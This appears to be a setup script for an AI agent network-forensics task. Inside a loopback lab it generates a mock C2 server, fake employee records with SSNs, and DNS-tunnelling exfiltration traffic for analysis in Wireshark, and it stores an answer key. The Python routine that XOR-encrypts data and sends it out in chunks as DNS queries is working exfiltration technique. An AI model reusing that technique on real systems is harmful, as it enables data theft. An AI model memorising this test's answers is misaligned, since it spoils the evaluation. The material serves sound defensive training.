#!/bin/bash
set -e

echo "=== Setting up Encrypted C2 DNS Exfiltration task ==="

source /workspace/scripts/task_utils.sh

# ---- Clean stale outputs BEFORE recording timestamp ----
rm -f /home/ga/Documents/forensic_evidence.json 2>/dev/null || true
rm -f /tmp/task_result.json 2>/dev/null || true

# Record task start time
date +%s > /tmp/task_start_time.txt

# Directories
CAPTURE_DIR="/home/ga/Documents/captures"
GT_DIR="/var/lib/wireshark_ground_truth"
mkdir -p "$CAPTURE_DIR" "$GT_DIR"

# ============================================================
# STEP 1: Generate the stolen employee data (realistic CSV)
# ============================================================
cat > /tmp/stolen_data.csv << 'CSVEOF'
id,first_name,last_name,email,ssn,department
1,James,Whitfield,jwhitfield@acmecorp.com,341-89-7623,Engineering
2,Maria,Chen,mchen@acmecorp.com,527-14-8890,Finance
3,Robert,Okafor,rokafor@acmecorp.com,198-63-4412,Human Resources
4,Svetlana,Petrov,spetrov@acmecorp.com,662-30-1187,Engineering
5,Ahmed,Hassan,ahassan@acmecorp.com,443-77-2956,Sales
6,Priya,Narayanan,pnarayanan@acmecorp.com,815-42-6603,Research
7,Carlos,Mendez,cmendez@acmecorp.com,279-58-3341,Legal
8,Yuki,Tanaka,ytanaka@acmecorp.com,906-21-5578,Engineering
9,Olivia,Williams,owilliams@acmecorp.com,134-96-8847,Marketing
10,Erik,Johansson,ejohansson@acmecorp.com,758-03-2219,Operations
11,Fatima,Al-Rashid,falrashid@acmecorp.com,491-67-3382,Finance
12,Dmitry,Volkov,dvolkov@acmecorp.com,623-84-1145,Engineering
CSVEOF

# ============================================================
# STEP 2: XOR encrypt, base64 encode, split into DNS chunks
# ============================================================
XOR_KEY="k7Xm9pQ2"
EXFIL_DOMAIN="sync-telemetry.analytics-cdn.net"
C2_SNI="secure-updates.corp-cdn.net"

python3 << 'PYEOF'
import base64, hashlib, json

with open('/tmp/stolen_data.csv', 'r') as f:
    data = f.read()

data_bytes = data.encode('utf-8')

# Ground truth: SHA-256 of original data and first line
sha256_hash = hashlib.sha256(data_bytes).hexdigest()
first_line = data.split('\n')[0]

# XOR encrypt
xor_key = b'k7Xm9pQ2'
xor_encrypted = bytes(b ^ xor_key[i % len(xor_key)] for i, b in enumerate(data_bytes))

# Base64 encode (standard), then make URL-safe for DNS labels
b64_standard = base64.b64encode(xor_encrypted).decode('ascii')
# Replace chars invalid in DNS labels: + -> -, / -> _, strip =
b64_safe = b64_standard.replace('+', '-').replace('/', '_').rstrip('=')

# Split into chunks of ~50 chars each (safe subdomain label length)
chunk_size = 50
chunks = [b64_safe[i:i+chunk_size] for i in range(0, len(b64_safe), chunk_size)]

# Save chunks for the DNS tunneling script
with open('/tmp/dns_chunks.json', 'w') as f:
    json.dump({'chunks': chunks, 'total': len(chunks)}, f)

# Save partial ground truth
gt = {
    'c2_server_sni': 'secure-updates.corp-cdn.net',
    'exfil_domain': 'sync-telemetry.analytics-cdn.net',
    'exfil_source_ip': '10.0.1.10',
    'decoded_sha256': sha256_hash,
    'decoded_first_line': first_line
}
with open('/tmp/partial_gt.json', 'w') as f:
    json.dump(gt, f)

print(f"Data size: {len(data_bytes)} bytes, SHA-256: {sha256_hash}")
print(f"Encoded length: {len(b64_safe)}, Chunks: {len(chunks)}")
PYEOF

# ============================================================
# STEP 3: C2 command (deterministic, same every run)
# ============================================================
# This JSON is what the C2 server sends in its HTTP response body.
# Using json.dumps default formatting (spaces after : and ,)
C2_COMMAND='{"action": "exfiltrate", "method": "dns_tunnel", "domain": "sync-telemetry.analytics-cdn.net", "xor_key": "k7Xm9pQ2", "encoding": "base64"}'

# ============================================================
# STEP 4: Set up network (loopback aliases)
# ============================================================
ip addr add 10.0.1.10/24 dev lo 2>/dev/null || true   # Internal workstation
ip addr add 10.0.1.20/24 dev lo 2>/dev/null || true   # C2 server
ip addr add 10.0.1.30/24 dev lo 2>/dev/null || true   # Legit server 1
ip addr add 10.0.1.40/24 dev lo 2>/dev/null || true   # Legit server 2
ip addr add 10.0.1.50/24 dev lo 2>/dev/null || true   # Legit server 3
ip addr add 10.0.1.60/24 dev lo 2>/dev/null || true   # DNS server

# Add hostname entries for SNI
# Use a marker so we can identify our entries
grep -q "secure-updates.corp-cdn.net" /etc/hosts 2>/dev/null || \
cat >> /etc/hosts << 'HOSTSEOF'
# -- gym_anything c2 task --
10.0.1.20 secure-updates.corp-cdn.net
10.0.1.30 cdn.jquery.com
10.0.1.40 api.github.com
10.0.1.50 fonts.googleapis.com
HOSTSEOF

# ============================================================
# STEP 5: Generate TLS certificates (one per HTTPS server)
# ============================================================
echo "Generating TLS certificates..."
for HOST in "secure-updates.corp-cdn.net" "cdn.jquery.com" "api.github.com" "fonts.googleapis.com"; do
    openssl req -x509 -newkey rsa:2048 \
        -keyout "/tmp/key_${HOST}.pem" \
        -out "/tmp/cert_${HOST}.pem" \
        -days 1 -nodes \
        -subj "/CN=${HOST}" \
        2>/dev/null
done

# ============================================================
# STEP 6: Create and start server scripts
# ============================================================

# --- C2 HTTPS Server (10.0.1.20:443) ---
cat > /tmp/c2_server.py << 'SRVEOF'
import http.server, ssl, json

class C2Handler(http.server.BaseHTTPRequestHandler):
    def do_GET(self):
        self.send_response(200)
        self.send_header('Content-Type', 'application/json')
        self.end_headers()
        cmd = json.dumps({
            "action": "exfiltrate",
            "method": "dns_tunnel",
            "domain": "sync-telemetry.analytics-cdn.net",
            "xor_key": "k7Xm9pQ2",
            "encoding": "base64"
        })
        self.wfile.write(cmd.encode())
    def log_message(self, *a):
        pass

ctx = ssl.SSLContext(ssl.PROTOCOL_TLS_SERVER)
ctx.load_cert_chain('/tmp/cert_secure-updates.corp-cdn.net.pem',
                    '/tmp/key_secure-updates.corp-cdn.net.pem')
srv = http.server.HTTPServer(('10.0.1.20', 443), C2Handler)
srv.socket = ctx.wrap_socket(srv.socket, server_side=True)
srv.serve_forever()
SRVEOF

# --- Legitimate HTTPS Server (generic, takes bind IP + cert as args) ---
cat > /tmp/legit_server.py << 'SRVEOF'
import http.server, ssl, sys

class LegitHandler(http.server.BaseHTTPRequestHandler):
    def do_GET(self):
        self.send_response(200)
        self.send_header('Content-Type', 'text/html')
        self.end_headers()
        self.wfile.write(b'<html><body><h1>Welcome</h1><p>Standard page content.</p></body></html>')
    def log_message(self, *a):
        pass

bind_ip = sys.argv[1]
cert = sys.argv[2]
key = sys.argv[3]
ctx = ssl.SSLContext(ssl.PROTOCOL_TLS_SERVER)
ctx.load_cert_chain(cert, key)
srv = http.server.HTTPServer((bind_ip, 443), LegitHandler)
srv.socket = ctx.wrap_socket(srv.socket, server_side=True)
srv.serve_forever()
SRVEOF

# --- Minimal DNS responder (10.0.1.60:53) ---
cat > /tmp/dns_server.py << 'SRVEOF'
import socket, struct

sock = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
sock.setsockopt(socket.SOL_SOCKET, socket.SO_REUSEADDR, 1)
sock.bind(('10.0.1.60', 53))
while True:
    data, addr = sock.recvfrom(4096)
    if len(data) < 12:
        continue
    # Build minimal DNS response: set QR flag, copy query, add 1 answer
    resp = bytearray(data)
    resp[2] = 0x81   # QR=1, RD=1
    resp[3] = 0x80   # RA=1
    resp[6:8] = b'\x00\x01'  # ANCOUNT=1
    # Append answer: name pointer, type A, class IN, TTL 60, rdata 10.0.1.60
    resp += b'\xc0\x0c'               # pointer to question name
    resp += b'\x00\x01\x00\x01'       # type A, class IN
    resp += struct.pack('>I', 60)      # TTL
    resp += b'\x00\x04'               # rdlength
    resp += socket.inet_aton('10.0.1.60')
    sock.sendto(bytes(resp), addr)
SRVEOF

# Start all servers in background
echo "Starting servers..."
python3 /tmp/c2_server.py &
C2_PID=$!

python3 /tmp/legit_server.py 10.0.1.30 /tmp/cert_cdn.jquery.com.pem /tmp/key_cdn.jquery.com.pem &
LEGIT1_PID=$!

python3 /tmp/legit_server.py 10.0.1.40 /tmp/cert_api.github.com.pem /tmp/key_api.github.com.pem &
LEGIT2_PID=$!

python3 /tmp/legit_server.py 10.0.1.50 /tmp/cert_fonts.googleapis.com.pem /tmp/key_fonts.googleapis.com.pem &
LEGIT3_PID=$!

python3 /tmp/dns_server.py &
DNS_PID=$!

sleep 3  # Wait for all servers to bind

# ============================================================
# STEP 7: Start packet capture
# ============================================================
echo "Starting packet capture..."
tcpdump -i lo -w /tmp/corporate_traffic.pcapng \
    "host 10.0.1.10 or host 10.0.1.20 or host 10.0.1.30 or host 10.0.1.40 or host 10.0.1.50 or host 10.0.1.60" \
    -s 0 &
TCPDUMP_PID=$!
sleep 2

# ============================================================
# STEP 8: Generate all traffic
# ============================================================
export SSLKEYLOGFILE="/tmp/all_keys.log"

# --- Phase 1: Legitimate HTTPS browsing ---
echo "Generating legitimate HTTPS traffic..."
curl -sk --interface 10.0.1.10 --resolve cdn.jquery.com:443:10.0.1.30 \
    https://cdn.jquery.com/jquery.min.js > /dev/null 2>&1 || true
sleep 0.3

curl -sk --interface 10.0.1.10 --resolve api.github.com:443:10.0.1.40 \
    https://api.github.com/v1/repos > /dev/null 2>&1 || true
sleep 0.3

curl -sk --interface 10.0.1.10 --resolve fonts.googleapis.com:443:10.0.1.50 \
    https://fonts.googleapis.com/css > /dev/null 2>&1 || true
sleep 0.5

# --- Phase 2: Normal DNS queries ---
echo "Generating normal DNS traffic..."
python3 << 'DNSEOF'
import socket, struct, random, time

def build_dns_query(name):
    txid = random.randint(0, 65535).to_bytes(2, 'big')
    flags = b'\x01\x00'
    counts = b'\x00\x01\x00\x00\x00\x00\x00\x00'
    qname = b''
    for label in name.split('.'):
        qname += bytes([len(label)]) + label.encode('ascii')
    qname += b'\x00'
    qtype = b'\x00\x01'
    qclass = b'\x00\x01'
    return txid + flags + counts + qname + qtype + qclass

src_ip = '10.0.1.10'
dns_server = ('10.0.1.60', 53)
normal_domains = [
    'google.com', 'weather.com', 'stackoverflow.com',
    'reddit.com', 'news.ycombinator.com', 'amazon.com',
    'linkedin.com', 'wikipedia.org'
]

sock = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
sock.bind((src_ip, 0))
sock.settimeout(1.0)

for domain in normal_domains:
    pkt = build_dns_query(domain)
    sock.sendto(pkt, dns_server)
    try:
        sock.recvfrom(4096)
    except socket.timeout:
        pass
    time.sleep(0.1)

sock.close()
DNSEOF
sleep 0.5

# --- Phase 3: More legitimate HTTPS ---
curl -sk --interface 10.0.1.10 --resolve cdn.jquery.com:443:10.0.1.30 \
    https://cdn.jquery.com/ui/1.12/jquery-ui.min.js > /dev/null 2>&1 || true
sleep 0.3

curl -sk --interface 10.0.1.10 --resolve api.github.com:443:10.0.1.40 \
    https://api.github.com/v1/users > /dev/null 2>&1 || true
sleep 0.5

# --- Phase 4: C2 HTTPS session (the one the agent must find) ---
echo "Generating C2 traffic..."
curl -sk --interface 10.0.1.10 --resolve secure-updates.corp-cdn.net:443:10.0.1.20 \
    https://secure-updates.corp-cdn.net/check-update > /dev/null 2>&1 || true
sleep 1

# --- Phase 5: More normal DNS (post-C2, pre-exfil) ---
python3 << 'DNSEOF2'
import socket, struct, random, time

def build_dns_query(name):
    txid = random.randint(0, 65535).to_bytes(2, 'big')
    flags = b'\x01\x00'
    counts = b'\x00\x01\x00\x00\x00\x00\x00\x00'
    qname = b''
    for label in name.split('.'):
        qname += bytes([len(label)]) + label.encode('ascii')
    qname += b'\x00'
    return txid + flags + counts + qname + b'\x00\x01\x00\x01'

sock = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
sock.bind(('10.0.1.10', 0))
sock.settimeout(1.0)
for d in ['microsoft.com', 'apple.com', 'cloudflare.com']:
    sock.sendto(build_dns_query(d), ('10.0.1.60', 53))
    try:
        sock.recvfrom(4096)
    except socket.timeout:
        pass
    time.sleep(0.1)
sock.close()
DNSEOF2
sleep 0.3

# --- Phase 6: DNS tunneling exfiltration ---
echo "Generating DNS tunneling traffic..."
python3 << 'TUNNELEOF'
import json, socket, struct, random, time

with open('/tmp/dns_chunks.json') as f:
    chunks = json.load(f)['chunks']

domain = 'sync-telemetry.analytics-cdn.net'
src_ip = '10.0.1.10'
dns_server = ('10.0.1.60', 53)

def build_dns_query(name):
    txid = random.randint(0, 65535).to_bytes(2, 'big')
    flags = b'\x01\x00'
    counts = b'\x00\x01\x00\x00\x00\x00\x00\x00'
    qname = b''
    for label in name.split('.'):
        qname += bytes([len(label)]) + label.encode('ascii')
    qname += b'\x00'
    return txid + flags + counts + qname + b'\x00\x01\x00\x01'

sock = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
sock.bind((src_ip, 0))
sock.settimeout(1.0)

for i, chunk in enumerate(chunks):
    # Format: <seq>.<encoded_chunk>.<domain>
    query_name = f"{i:03d}.{chunk}.{domain}"
    pkt = build_dns_query(query_name)
    sock.sendto(pkt, dns_server)
    try:
        sock.recvfrom(4096)
    except socket.timeout:
        pass
    time.sleep(0.08)

sock.close()
print(f"Sent {len(chunks)} DNS tunnel queries")
TUNNELEOF

# --- Phase 7: Post-exfil normal traffic (cover) ---
sleep 0.5
curl -sk --interface 10.0.1.10 --resolve fonts.googleapis.com:443:10.0.1.50 \
    https://fonts.googleapis.com/icon > /dev/null 2>&1 || true

python3 << 'DNSEOF3'
import socket, struct, random, time
def build_dns_query(name):
    txid = random.randint(0, 65535).to_bytes(2, 'big')
    flags = b'\x01\x00'
    counts = b'\x00\x01\x00\x00\x00\x00\x00\x00'
    qname = b''
    for label in name.split('.'):
        qname += bytes([len(label)]) + label.encode('ascii')
    qname += b'\x00'
    return txid + flags + counts + qname + b'\x00\x01\x00\x01'
sock = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
sock.bind(('10.0.1.10', 0))
sock.settimeout(1.0)
for d in ['github.com', 'npmjs.com']:
    sock.sendto(build_dns_query(d), ('10.0.1.60', 53))
    try:
        sock.recvfrom(4096)
    except socket.timeout:
        pass
    time.sleep(0.1)
sock.close()
DNSEOF3

sleep 2

# ============================================================
# STEP 9: Stop capture and all servers
# ============================================================
echo "Stopping capture and servers..."
kill $TCPDUMP_PID 2>/dev/null || true
wait $TCPDUMP_PID 2>/dev/null || true

kill $C2_PID $LEGIT1_PID $LEGIT2_PID $LEGIT3_PID $DNS_PID 2>/dev/null || true
wait $C2_PID $LEGIT1_PID $LEGIT2_PID $LEGIT3_PID $DNS_PID 2>/dev/null || true

# ============================================================
# STEP 10: Compute and store ground truth
# ============================================================
echo "Computing ground truth..."

# Count DNS tunnel queries from the actual capture
DNS_TUNNEL_COUNT=$(tshark -r /tmp/corporate_traffic.pcapng \
    -Y "dns.qry.name contains \"$EXFIL_DOMAIN\" && dns.flags.response == 0" \
    2>/dev/null | wc -l || echo "0")

# Assemble full ground truth
python3 << GTEOF
import json

with open('/tmp/partial_gt.json') as f:
    gt = json.load(f)

# C2 command text matches what the C2 server sends via json.dumps defaults
gt['c2_command_text'] = json.dumps({
    "action": "exfiltrate",
    "method": "dns_tunnel",
    "domain": "sync-telemetry.analytics-cdn.net",
    "xor_key": "k7Xm9pQ2",
    "encoding": "base64"
})
gt['dns_tunnel_query_count'] = $DNS_TUNNEL_COUNT

with open('$GT_DIR/ground_truth.json', 'w') as f:
    json.dump(gt, f, indent=2)
GTEOF

chmod 700 "$GT_DIR"
chmod 600 "$GT_DIR/ground_truth.json"

echo "Ground truth stored."
cat "$GT_DIR/ground_truth.json"

# ============================================================
# STEP 11: Deliver files to user-accessible location
# ============================================================
cp /tmp/corporate_traffic.pcapng "$CAPTURE_DIR/corporate_traffic.pcapng"
cp /tmp/all_keys.log "$CAPTURE_DIR/tls_keys.log"
chown ga:ga "$CAPTURE_DIR/corporate_traffic.pcapng" "$CAPTURE_DIR/tls_keys.log"
chmod 644 "$CAPTURE_DIR/corporate_traffic.pcapng" "$CAPTURE_DIR/tls_keys.log"

# Clean up all temp files (prevent agent from finding answers)
rm -f /tmp/stolen_data.csv /tmp/dns_chunks.json /tmp/partial_gt.json
rm -f /tmp/all_keys.log /tmp/corporate_traffic.pcapng
rm -f /tmp/c2_server.py /tmp/legit_server.py /tmp/dns_server.py
rm -f /tmp/cert_*.pem /tmp/key_*.pem

# ============================================================
# STEP 12: Launch Wireshark (empty — agent must open the pcap)
# ============================================================
echo "Launching Wireshark..."
pkill -f wireshark 2>/dev/null || true
sleep 1

su - ga -c "DISPLAY=:1 wireshark &"

for i in {1..30}; do
    if DISPLAY=:1 wmctrl -l | grep -i "Wireshark"; then
        break
    fi
    sleep 1
done

DISPLAY=:1 wmctrl -r "Wireshark" -b add,maximized_vert,maximized_horz 2>/dev/null || true
DISPLAY=:1 wmctrl -a "Wireshark" 2>/dev/null || true
sleep 2
DISPLAY=:1 xdotool key Escape 2>/dev/null || true

take_screenshot /tmp/task_initial.png

echo "=== Task setup complete ==="
